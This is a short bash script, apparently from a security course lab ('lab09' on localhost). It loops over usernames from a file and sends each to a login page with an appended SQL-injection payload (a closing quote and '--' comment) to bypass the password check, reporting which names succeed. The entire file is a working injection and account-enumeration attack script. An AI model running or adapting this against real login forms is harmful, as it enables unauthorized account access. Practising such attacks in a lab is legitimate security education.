#!/bin/bash

input="input.txt"
while IFS='' read -r line || [[ -n "$line" ]]; do
	curl -s --data "u=$line%22%20--%20" http://localhost/lab09/login.php > result.html

	file=$(<result.html)
	substring="cat.JPG"

	if [[ $file =~ $substring ]];
	then
		echo "$line"	
	fi
done < "$input"
